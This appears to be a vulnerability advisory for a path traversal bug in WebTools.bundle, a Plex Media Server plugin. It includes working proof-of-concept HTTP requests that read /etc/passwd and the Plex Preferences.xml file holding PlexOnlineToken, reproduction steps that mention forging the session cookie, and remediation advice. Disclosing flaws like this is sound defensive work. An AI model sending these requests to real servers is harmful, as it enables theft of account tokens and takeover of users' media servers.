# WebTools.bundle — Path traversal in the logs download endpoint allows arbitrary file read

## Metadata

- **Vendor / project:** `ukdtom`
- **Product:** `WebTools.bundle` (third-party web management plugin for Plex Media Server)
- **Affected versions:** `3.0.0` and all versions up to `master` (tested: `3.0.0`)
- **CWE:** CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)
- **CVSS 4.0:** 8.7 High — `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N`
- **CVSS 3.1:** 7.5 High — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
- **Credit:** gucheNg
- **CVE:** pending

> Reachable **without credentials** when chained with the predictable-session-key
> authentication bypass (see [1.md](1.md)). Standalone exploitation requires an authenticated
> session.

## Summary

The `/api/v3/logs/download/{fileName}` endpoint takes the `fileName` path segment, URL-decodes
it, and passes it to `os.path.join(LOGDIR, fileName)` and then to `io.open()`, without checking
that the resulting path stays inside the log directory. When `fileName` is an absolute path,
`os.path.join` discards the log-directory prefix and returns the absolute path. Encoding the
leading slash as `%2F` survives the server-side path-segment split and is decoded again
afterwards, so a remote attacker can read arbitrary files accessible to the WebTools process —
including `/etc/passwd` and the Plex `Preferences.xml` file, which contains the
`PlexOnlineToken`.

There is no `os.path.realpath`/prefix check and no `os.path.basename`. Two independent defects
combine:

1. `os.path.join(LOGDIR, fileName)` returns `fileName` unchanged when it is absolute.
2. `String.Unquote()` is applied twice, so `%2F` survives routing (which splits the URL on `/`)
   and is decoded back to `/` before the file is opened.

## Proof of concept

Read the system account file:

```http
GET /api/v3/logs/download/%2Fetc%2Fpasswd HTTP/1.1
Host: TARGET:33400
Cookie: WebTools=MQ==|<unix-ts>|<HMAC-SHA1>
```

Response: `200 OK` with the full contents of `/etc/passwd`.

Read the Plex server configuration (contains the production token):

```http
GET /api/v3/logs/download/%2Fconfig%2FLibrary%2FApplication%20Support%2FPlex%20Media%20Server%2FPreferences.xml HTTP/1.1
Host: TARGET:33400
Cookie: WebTools=MQ==|<unix-ts>|<HMAC-SHA1>
```

Response: `200 OK`, body contains `PlexOnlineToken` and `PlexOnlineMail`.

Contrast — the same request **without** the cookie returns `302` to `/login`.

Full Yakit-ready request list: [`poc/webtools_lfi_packets.md`](poc/webtools_lfi_packets.md)

## Reproduction

1. Obtain a session: complete a normal login, or forge the signed session cookie using the
   predictable `cookie_secret` (see [1.md](1.md)).
2. Request `/api/v3/logs/download/%2Fetc%2Fpasswd` with the `Cookie` header → `200` and the
   contents of `/etc/passwd`.
3. Request `/api/v3/logs/download/%2Fconfig%2FLibrary%2FApplication%20Support%2FPlex%20Media%20Server%2FPreferences.xml`
   → `200` and the `PlexOnlineToken`.
4. Remove the cookie and repeat step 2 → `302 /login`, confirming the read is gated only by the
   (forgeable) session.

## Impact

Arbitrary file read within the privileges of the WebTools process. The Plex
`Preferences.xml` exposes `PlexOnlineToken`, which grants control of the Plex account and the
associated server; `/etc/passwd` and other configuration files disclose further information for
lateral movement. Chained with the authentication bypass, the whole chain is pre-authentication.

## Remediation

1. Accept only a known log file name: validate against a whitelist of files inside the log
   directory, and reject any input containing `/`, `\`, `%2F`, `%5C` or dot-segments.
2. Canonicalise with `os.path.realpath` and require the result to remain under the log
   directory; strip directory information with `os.path.basename`. URL-decode exactly once.
3. Run the WebTools process with least privilege, and restrict the management port to a trusted
   network / authenticating reverse proxy (the project is no longer maintained).
